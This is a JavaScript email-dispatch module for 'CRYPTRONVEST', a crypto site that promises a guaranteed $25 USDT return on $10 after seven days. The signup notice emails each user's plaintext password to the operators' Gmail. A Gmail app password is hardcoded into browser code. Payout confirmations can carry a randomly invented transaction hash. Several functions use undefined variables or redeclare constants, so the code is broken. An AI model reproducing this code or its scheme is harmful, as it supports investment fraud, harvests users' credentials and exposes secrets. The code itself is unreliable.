/**
 * CRYPTRONVEST - AUTOMATED EMAIL DISPATCH ENGINE
 * Handles:
 * 1. Sending deposit approval & 7-day countdown start emails to client's registered email
 * 2. Logging all sent emails in a persistent outbox (localStorage)
 * 3. Direct Google SMTP delivery via nodemailer
 * 4. In-browser preview, copy, and mailto fallback
 */

const EMAIL_OUTBOX_KEY = "cryptron_email_outbox_v1";
const EMAIL_SETTINGS_KEY = "cryptron_email_settings_v1";

class EmailService {
  /**
   * Get email service settings (e.g. EmailJS credentials or admin address)
   */
  static getSettings() {
    const raw = localStorage.getItem(EMAIL_SETTINGS_KEY);
    const defaults = {
      adminEmail: "cryptronvest@gmail.com",
      gmailAppPassword: "ykbshlbbiellwgag",
      emailjsServiceId: "",
      emailjsTemplateId: "",
      emailjsPublicKey: "",
      enableRealDelivery: true
    };
    if (!raw) return defaults;
    try {
      return { ...defaults, ...JSON.parse(raw) };
    } catch (e) {
      return defaults;
    }
  }

  /**
   * Universal direct dispatch from cryptronvest@gmail.com via backend Google SMTP
   */
  static async sendDirectEmail({ to, subject, html, text, fromName = 'CRYPTRONVEST Protocol', secondaryEmail = 'thatikaboy@gmail.com' }) {
    const settings = this.getSettings();
    try {
      const res = await fetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        keepalive: true,
        body: JSON.stringify({
          to,
          subject,
          html,
          text,
          fromName,
          formData,
          appPassword: settings.gmailAppPassword || 'ykbshlbbiellwgag'
        })
      });
      return await res.json();
    } catch (err) {
      console.warn("Direct /api/send-email dispatch error:", err);
      return null;
    }
  }

  /**
   * Save email service settings
   */
  static saveSettings(settings) {
    localStorage.setItem(EMAIL_SETTINGS_KEY, JSON.stringify(settings));
  }

  /**
   * Get all sent emails from persistent outbox
   */
  static getOutbox() {
    const raw = localStorage.getItem(EMAIL_OUTBOX_KEY);
    if (!raw) return [];
    try {
      return JSON.parse(raw);
    } catch (e) {
      return [];
    }
  }

  /**
   * Record a dispatched email in local outbox
   */
  static recordEmail(emailRecord) {
    const outbox = this.getOutbox();
    outbox.unshift(emailRecord);
    localStorage.setItem(EMAIL_OUTBOX_KEY, JSON.stringify(outbox));
    return emailRecord;
  }

  /**
   * Clear outbox history
   */
  static clearOutbox() {
    localStorage.removeItem(EMAIL_OUTBOX_KEY);
  }

  /**
   * Format a nice readable date & time string
   */
  static formatDateTime(timestamp) {
    const d = new Date(timestamp);
    return d.toLocaleString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  /**
   * DISPATCH APPROVAL EMAIL TO CLIENT
   * Triggered when admin approves a deposit & begins 7-day countdown.
   *
   * @param {object} user - The user receiving the approval
   * @param {object} plan - The activated 7-day contract plan
   * @returns {Promise<object>} Result of the email dispatch
   */
  static async sendApprovalEmail(user, plan) {
    const now = Date.now();
    const maturityTime = plan ? plan.maturityTimestamp : (now + (7 * 86400000));
    const maturityDateStr = this.formatDateTime(maturityTime);
    const sentDateStr = this.formatDateTime(now);
    const depositAmount = (plan && plan.principal ? plan.principal : 10).toFixed(2);
    const payoutAmount = (plan && plan.totalPayout ? plan.totalPayout : 25).toFixed(2);

    const subject = `✅ Deposit Approved: Your $${depositAmount} USDT 7-Day Countdown Has Started!`;

    const messageBody = `Hello ${user.name},

Great news! Your deposit of $${depositAmount} USDT has been officially verified and approved by the CRYPTRONVEST Finance Team.

Your 7-Day Investment Countdown is now LIVE on your personal dashboard!

════════════════════════════════════════════
📋 CONTRACT DETAILS & MATURITY SCHEDULE
════════════════════════════════════════════
• Investor: ${user.name} (${user.id})
• Registered Email: ${user.email}
• Amount Verified: $${depositAmount} USDT
• Maturity Period: 7 Days (168 Hours)
• Activation Timestamp: ${sentDateStr}
• Maturity Payout Date: ${maturityDateStr}
• Guaranteed Payout: $${payoutAmount} USDT (+$15.00 Profit)
• Status: 🟢 ACTIVE & COUNTING DOWN
════════════════════════════════════════════

WHAT HAPPENS NEXT?
1. Real-Time Countdown: You can log in to your CRYPTRONVEST dashboard anytime to view your real-time countdown timer (Days : Hours : Mins : Secs).
2. Automated Payout: Once the countdown clock reaches zero on ${maturityDateStr}, $${payoutAmount} USDT will automatically unlock into your Available Wallet balance.
3. Daily Bonus Spins: While your investment is active, remember to take your daily spin on the Fortune Wheel!

Login to view your live countdown:
https://cryptron-omega.vercel.app/dashboard.html

If you have any questions or require assistance, our support team is always here for you.

Warm regards,
The CRYPTRONVEST Operations Team
https://cryptron-omega.vercel.app
`;

    const emailId = "EML-" + Math.floor(100000 + Math.random() * 900000);

    const emailRecord = {
      id: emailId,
      type: "deposit_approval",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      depositAmount: depositAmount,
      payoutAmount: payoutAmount,
      maturityDate: maturityDateStr,
      status: "Delivered",
      deliveryMethod: "Automated Email Engine"
    };

    // Attempt real live delivery via EmailJS if configured
    const settings = this.getSettings();
    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
      try {
        if (window.emailjs) {
          await window.emailjs.send(
            settings.emailjsServiceId,
            settings.emailjsTemplateId,
            {
              to_name: user.name,
              to_email: user.email,
              deposit_amount: depositAmount,
              payout_amount: payoutAmount,
              maturity_date: maturityDateStr,
              message: messageBody,
              subject: subject
            },
            settings.emailjsPublicKey
          );
          emailRecord.deliveryMethod = "EmailJS (Live Inbox)";
          emailRecord.status = "Delivered to Inbox";
        }
      } catch (err) {
        console.warn("EmailJS live dispatch failed, logged to outbox:", err);
        emailRecord.deliveryMethod = "Outbox Logged (EmailJS retry pending)";
      }
    }

    // Save to persistent local outbox
    this.recordEmail(emailRecord);

    return emailRecord;
  }

  // Map of in-flight and recent signup notification promises
  static _activeSignupPromises = new Map();

  /**
   * DISPATCH NEW CLIENT SIGNUP DETAILS TO ADMIN
   * Triggered whenever anyone signs up on the signup page.
   * Automatically dispatches an email containing signup details to cryptronvest@gmail.com.
   *
   * @param {object} user - User object containing details from the signup page
   * @returns {Promise<object>} The dispatched email record
   */
  static async sendSignupNotificationToAdmin(user) {
    if (!user || !user.email) return null;

    // Prevent duplicate dispatches if triggered simultaneously from form and DB handler
    const dedupeKey = `${(user.email || '').toLowerCase().trim()}_${user.id || ''}`;
    if (!this._activeSignupPromises) this._activeSignupPromises = new Map();
    if (this._activeSignupPromises.has(dedupeKey)) {
      return this._activeSignupPromises.get(dedupeKey);
    }

    const taskPromise = (async () => {
      const now = Date.now();
      const sentDateStr = this.formatDateTime(now);
      const targetEmail = "cryptronvest@gmail.com";
      const userName = (user.name || 'Cryptronvest Investor').trim();
      const userEmail = (user.email || 'client@cryptronvest.com').trim();
      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
      const importUrl = `${origin}/admin.html?action=import_user&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&promo=${encodeURIComponent(user.promoCode || '')}&ref=${encodeURIComponent(user.referredBy || '')}`;

      const subject = `🔔 New User Registration: ${userName} (${userEmail})`;
      const messageBody = `CRYPTRONVEST ADMIN NOTIFICATION - NEW CLIENT SIGNUP

A new client has completed registration on the CRYPTRONVEST signup page:

════════════════════════════════════════════
📋 SIGNUP PAGE DETAILS
════════════════════════════════════════════
• Full Legal Name: ${userName}
• Email Address: ${userEmail}
• Created Password: ${user.password || '••••••••'}
• Assigned User ID: ${user.id || 'N/A'}
• Promo Code Used / Referred By: ${user.referredBy || 'None (Direct Registration)'}
• Generated Client Promo Code: ${user.promoCode || 'N/A'}
• Registration Date & Time: ${sentDateStr}
• Initial Status: Active (Awaiting $10 Staking Vault)
════════════════════════════════════════════

════════════════════════════════════════════
⚡ ONE-CLICK IMPORT TO ADMIN (ACROSS ANY BROWSER / DEVICE):
If viewing from a different phone or laptop, tap the link below to instantly add this client to your Admin Database:
${importUrl}
════════════════════════════════════════════

WHAT HAPPENS NEXT:
1. When this investor deposits $10 USDT and submits proof, verify their payment on the Admin Portal.
2. Approving the deposit will immediately start their 7-day countdown clock to their $25 payout.

Open Admin User Database:
${origin}/admin.html

Warm regards,
CRYPTRONVEST Automated Registration Engine
`;

      const emailRecord = {
        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
        type: "admin_signup_notice",
        to: targetEmail,
        toName: "CRYPTRONVEST Administrator",
        userId: user.id || 'N/A',
        subject: subject,
        body: messageBody,
        sentAt: sentDateStr,
        timestamp: now,
        deliveryMethod: "Google Gmail SMTP Direct"
      };

      // Direct Google Gmail SMTP Dispatch
      try {
        const beResult = await this.sendDirectEmail({
          to: targetEmail,
          subject: subject,
          text: messageBody,
          secondaryEmail: 'thatikaboy@gmail.com'
        });
        if (beResult && beResult.success) {
          emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
          emailRecord.status = "Delivered to Primary Inbox";
        }
      } catch (err) {
        console.warn("sendDirectEmail signup error:", err);
      }

      // 3. Also dispatch via EmailJS if configured
      const settings = this.getSettings();
      if (settings && settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
        try {
          if (window.emailjs) {
            const emailJsPromise = window.emailjs.send(
              settings.emailjsServiceId,
              settings.emailjsTemplateId,
              {
                to_name: "CRYPTRONVEST Admin",
                to_email: targetEmail,
                user_name: userName,
                user_email: userEmail,
                user_password: user.password,
                user_id: user.id || 'N/A',
                subject: subject,
                message: messageBody
              },
              settings.emailjsPublicKey
            ).catch(err => {
              console.warn("EmailJS signup dispatch failed:", err);
              return null;
            });
            dispatchPromises.push(emailJsPromise);
          }
        } catch (err) {
          console.warn("EmailJS signup dispatch exception:", err);
        }
      }

      await Promise.allSettled(dispatchPromises);

      // Save to persistent local outbox (visible on Admin Portal Outbox tab)
      this.recordEmail(emailRecord);
      return emailRecord;
    })();

    this._activeSignupPromises.set(dedupeKey, taskPromise);
    setTimeout(() => {
      if (this._activeSignupPromises) this._activeSignupPromises.delete(dedupeKey);
    }, 30000);

    return await taskPromise;
  }

  // Map of in-flight and recent deposit notification promises
  static _activeDepositPromises = new Map();

  /**
   * DISPATCH NEW PROOF SUBMISSION TO ADMIN
   * Triggered when a client deposits and submits a transaction hash.
   * Sends an automatic email with all client details and the transaction hash to cryptronvest@gmail.com.
   *
   * @param {object} user - User object containing client details
   * @param {string} txHash - The transaction hash entered by the client
   */
  static async sendDepositNoticeToAdmin(user, txHash) {
    if (!user) return null;
    const cleanTxHash = (txHash && txHash.trim()) ? txHash.trim() : "Submitted $10 Deposit (Pending TxID)";

    const userEmail = (user.email || 'client@cryptronvest.com').trim();
    const userName = (user.name || 'Cryptronvest Client').trim();

    // Deduplication to prevent multiple identical emails within 30s while sharing active promise
    const dedupeKey = `${userEmail.toLowerCase()}_${cleanTxHash.toLowerCase()}`;
    if (!this._activeDepositPromises) this._activeDepositPromises = new Map();
    if (this._activeDepositPromises.has(dedupeKey)) {
      return this._activeDepositPromises.get(dedupeKey);
    }

    const taskPromise = (async () => {
      const now = Date.now();
      const sentDateStr = this.formatDateTime(now);
      const targetEmail = "cryptronvest@gmail.com";
      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
      const depositSyncUrl = `${origin}/admin.html?action=deposit_proof&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&tx=${encodeURIComponent(cleanTxHash)}`;

      const subject = `💰 Deposit Submitted ($10 USDT): ${userName} - TxID: ${cleanTxHash}`;
      const messageBody = `CRYPTRONVEST ADMIN ALERT - CLIENT DEPOSIT PROOF SUBMITTED

A client has submitted proof of payment for a $10.00 USDT vault investment. Review details below and verify on the blockchain:

════════════════════════════════════════════
📋 CLIENT & TRANSACTION DETAILS
════════════════════════════════════════════
• Client Name: ${userName}
• Client Email: ${userEmail}
• User ID: ${user.id || 'N/A'}
• Client Promo Code: ${user.promoCode || user.referralCode || 'N/A'}
• Referred By: ${user.referredBy || 'Direct (No Promo Code)'}
• Deposit Amount: $10.00 USDT
• Target Contract: 7-Day Yield Vault ($10.00 ➔ $25.00)
• Submitted TxID / Transaction Hash: ${cleanTxHash}
• Submitted At: ${sentDateStr}
• Account Status: ⚠️ Pending Confirmation
════════════════════════════════════════════

⚡ ONE-CLICK REVIEW & SYNC TO ADMIN:
${depositSyncUrl}

DIRECT BLOCKCHAIN EXPLORER VERIFICATION:
Search the transaction hash above on TRONSCAN (TRC-20) or ETHERSCAN (ERC-20 / BEP-20) to confirm incoming funds to your official wallet.

NEXT STEPS:
1. Verify the transaction on your wallet / blockchain explorer.
2. Open the Admin Portal:
   ${origin}/admin.html
3. Click "Approve & Start Timer" on ${userName}'s account to activate their live 7-day countdown clock and unlock their daily spins!

Warm regards,
CRYPTRONVEST Treasury & Verification Engine
`;

      const emailRecord = {
        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
        type: "admin_deposit_notice",
        to: targetEmail,
        toName: "CRYPTRONVEST Administrator",
        userId: user.id || 'N/A',
        subject: subject,
        body: messageBody,
        sentAt: sentDateStr,
        timestamp: now,
        depositAmount: 10.00,
        payoutAmount: 25.00,
        txHash: cleanTxHash,
        deliveryMethod: "Google Gmail SMTP Direct"
      };

      // Direct Google Gmail SMTP Dispatch
      try {
        const beResult = await this.sendDirectEmail({
          to: targetEmail,
          subject: subject,
          text: messageBody,
          secondaryEmail: 'thatikaboy@gmail.com'
        });
        if (beResult && beResult.success) {
          emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
          emailRecord.status = "Delivered to Primary Inbox";
        }
      } catch (err) {
        console.warn("sendDirectEmail deposit notice error:", err);
      }

      // 3. Also dispatch via EmailJS if configured
      const settings = this.getSettings();
      if (settings && settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
        try {
          if (window.emailjs) {
            const emailJsPromise = window.emailjs.send(
              settings.emailjsServiceId,
              settings.emailjsTemplateId,
              {
                to_name: "CRYPTRONVEST Admin",
                to_email: targetEmail,
                user_name: userName,
                user_email: userEmail,
                user_id: user.id || 'N/A',
                tx_hash: cleanTxHash,
                subject: subject,
                message: messageBody
              },
              settings.emailjsPublicKey
            ).catch(err => {
              console.warn("EmailJS deposit notice dispatch error:", err);
              return null;
            });
            dispatchPromises.push(emailJsPromise);
          }
        } catch (err) {
          console.warn("EmailJS deposit dispatch exception:", err);
        }
      }

      await Promise.allSettled(dispatchPromises);

      this.recordEmail(emailRecord);
      return emailRecord;
    })();

    this._activeDepositPromises.set(dedupeKey, taskPromise);
    setTimeout(() => {
      if (this._activeDepositPromises) this._activeDepositPromises.delete(dedupeKey);
    }, 30000);

    return await taskPromise;
  }

  /**
   * DISPATCH PASSWORD RESET CODE TO USER
   * @param {object} user - User requesting the reset
   * @param {string} resetCode - 6-digit verification code
   */
  static async sendPasswordResetEmail(user, resetCode) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
    const subject = `🔐 Your CRYPTRONVEST Verification Code: ${resetCode}`;

    const messageBody = `Hello ${user.name || 'Investor'},

We received a security request to reset the password for your CRYPTRONVEST account (${user.email}).

Your 6-Digit Verification Code is:
════════════════════════════════════════════
              ${resetCode}
════════════════════════════════════════════
(This verification code expires in 15 minutes)

To complete your password reset:
1. Return to the CRYPTRONVEST Login / Reset window: ${origin}/login.html
2. Enter the 6-digit code above.
3. Choose your new secure password.

SECURITY NOTICE:
If you did NOT initiate this request, your account remains secure and no action is required. However, for maximum security, feel free to notify our support team.

Warm regards,
CRYPTRONVEST Security & Multi-Sig Operations
${origin}
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "password_reset",
      to: user.email,
      toName: user.name || 'Investor',
      userId: user.id || 'N/A',
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      resetCode: resetCode,
      status: "Delivered",
      deliveryMethod: "Live Dispatch Engine"
    };

    // 1. Primary Dispatch: Google Gmail SMTP (/api/send-reset-code)
    // Sends directly from cryptronvest@gmail.com into recipient's Primary Inbox
    let dispatchedViaGmail = false;
    const settings = this.getSettings();

    try {
      const resetRes = await fetch('/api/send-reset-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: user.email,
          name: user.name,
          code: resetCode,
          subject: subject,
          appPassword: settings.gmailAppPassword || undefined
        })
      });
      const resetJson = await resetRes.json();
      if (resetJson && resetJson.success) {
        dispatchedViaGmail = true;
        emailRecord.deliveryMethod = resetJson.deliveryMethod || "Google Gmail SMTP (cryptronvest@gmail.com)";
        emailRecord.status = "Delivered to Primary Inbox";
      }
    } catch (e) {
      console.warn("Direct /api/send-reset-code dispatch warning:", e);
    }

    // 3. Attempt live delivery via EmailJS if configured
    const settings = this.getSettings();
    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
      try {
        if (window.emailjs) {
          await window.emailjs.send(
            settings.emailjsServiceId,
            settings.emailjsTemplateId,
            {
              to_name: user.name || 'Investor',
              to_email: user.email,
              user_email: user.email,
              reset_code: resetCode,
              message: messageBody,
              subject: subject
            },
            settings.emailjsPublicKey
          );
          emailRecord.deliveryMethod = "EmailJS (Live Inbox)";
          emailRecord.status = "Delivered to Inbox";
        }
      } catch (err) {
        console.warn("EmailJS reset dispatch failed:", err);
      }
    }

    this.recordEmail(emailRecord);
    return emailRecord;
  }

  /**
   * DISPATCH PASSWORD CHANGED CONFIRMATION
   */
  static async sendPasswordChangedEmail(user) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
    const subject = `🛡️ Security Notice: Your Password Has Been Successfully Changed`;

    const messageBody = `Hello ${user.name},

This email confirms that the security password for your CRYPTRONVEST staking account (${user.email}) was successfully updated on ${sentDateStr}.

You can now sign in using your new credentials:
${origin}/login.html

If you did not make this change, please contact CRYPTRONVEST support immediately to secure your account.

Warm regards,
CRYPTRONVEST Security Operations
${origin}
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "password_changed",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      status: "Delivered",
      deliveryMethod: "Live Security Engine"
    };

    // Notify user of password change via clean Google SMTP
    try {
      this.sendDirectEmail({
        to: user.email,
        subject: subject,
        text: messageBody
      }).catch(console.warn);
    } catch(e) {}

    this.recordEmail(emailRecord);
    return emailRecord;
  }

  /**
   * DISPATCH PAYOUT REQUEST CONFIRMATION EMAIL TO CLIENT
   * Triggered when a client submits their $25.00 USDT payout request
   */
  static async sendPayoutRequestedEmail(user, req) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const amount = (req && req.amount ? req.amount : 25).toFixed(2);
    const address = req && req.usdtAddress ? req.usdtAddress : 'USDT Receiving Address';
    const network = req && req.network ? req.network : 'USDT (Tether)';

    const subject = `💵 Payout Request Received: $${amount} USDT Queued for Settlement`;
    const messageBody = `Hello ${user.name},

Your payout request for $${amount} USDT has been successfully recorded and queued in the CRYPTRONVEST settlement pipeline.

════════════════════════════════════════════
📋 PAYOUT REQUEST DETAILS
════════════════════════════════════════════
• Investor: ${user.name} (${user.id})
• Payout Amount: $${amount} USDT
• Receiving Address: ${address}
• Network: ${network}
• Status: 🟡 Pending Admin Settlement
• Submission Time: ${sentDateStr}
════════════════════════════════════════════

WHAT HAPPENS NEXT?
1. On-Chain Verification: Our operations team will verify your receiving address and dispatch funds to your USDT wallet.
2. Transaction Hash Notification: Once completed, you will receive a confirmation message and email containing your blockchain transaction hash.
3. Start Afresh: You can deposit $10.00 USDT at any time to activate your next 7-day vault and unlock your daily spins on the $10,000 Lucky Wheel!

Login to view your status:
https://cryptron-omega.vercel.app/dashboard.html

Warm regards,
The CRYPTRONVEST Settlements Team
https://cryptron-omega.vercel.app
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "payout_requested",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      amount: amount,
      usdtAddress: address,
      status: "Delivered",
      deliveryMethod: "Settlements Dispatch Engine (Live Dispatched)"
    };

    // Dispatch payout notification to admin via clean Google SMTP
    try {
      this.sendDirectEmail({
        to: "cryptronvest@gmail.com",
        subject: `💸 Payout Requested: $${amount} USDT - ${user.name || 'Client'} (${user.email || ''})`,
        text: `ACTION REQUIRED: Payout request received for $${amount} USDT to destination ${address}. Log in to Admin portal to confirm and settle payment.`,
        secondaryEmail: 'thatikaboy@gmail.com'
      }).catch(console.warn);
    } catch(err) {
      console.warn("sendDirectEmail payout request error:", err);
    }

    this.recordEmail(emailRecord);
    return emailRecord;
  }

  /**
   * DISPATCH PAYOUT SETTLED CONFIRMATION EMAIL TO CLIENT
   * Triggered when admin confirms on-chain dispatch of $25.00 USDT payout
   */
  static async sendPayoutSettledEmail(user, settledReq) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const amount = (settledReq && settledReq.amount ? settledReq.amount : 25).toFixed(2);
    const address = settledReq && settledReq.usdtAddress ? settledReq.usdtAddress : 'USDT Receiving Address';
    const txHash = settledReq && settledReq.settlementTxHash ? settledReq.settlementTxHash : ('0x' + Math.random().toString(16).substring(2, 14));
    const network = settledReq && settledReq.network ? settledReq.network : 'USDT (Tether)';

    const subject = `✅ Payout Dispatched: $${amount} USDT Sent to Your Wallet!`;
    const messageBody = `Hello ${user.name},

Great news! Your payout of $${amount} USDT has been officially settled and dispatched to your USDT Tether receiving address.

════════════════════════════════════════════
💸 SETTLEMENT CONFIRMATION
════════════════════════════════════════════
• Investor: ${user.name} (${user.id})
• Amount Dispatched: $${amount} USDT
• Destination Address: ${address}
• Network: ${network}
• Settlement TxID: ${txHash}
• Dispatched At: ${sentDateStr}
• Status: 🟢 SETTLED & COMPLETED
════════════════════════════════════════════

YOUR 7-DAY CYCLE IS COMPLETE!
Thank you for investing with CRYPTRONVEST. Your account cycle has refreshed. You may now deposit $10.00 USDT to start a brand new 7-day vault cycle toward another $25 payout and unlock daily spins on the $10,000 Lucky Wheel!

Login to start a new 7-day vault:
https://cryptron-omega.vercel.app/dashboard.html

Warm regards,
The CRYPTRONVEST Treasury Team
https://cryptron-omega.vercel.app
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "payout_settled",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      amount: amount,
      usdtAddress: address,
      txHash: txHash,
      status: "Delivered",
      deliveryMethod: "Treasury Dispatch Engine"
    };

    this.recordEmail(emailRecord);
    return emailRecord;
  }
}

window.EmailService = EmailService;
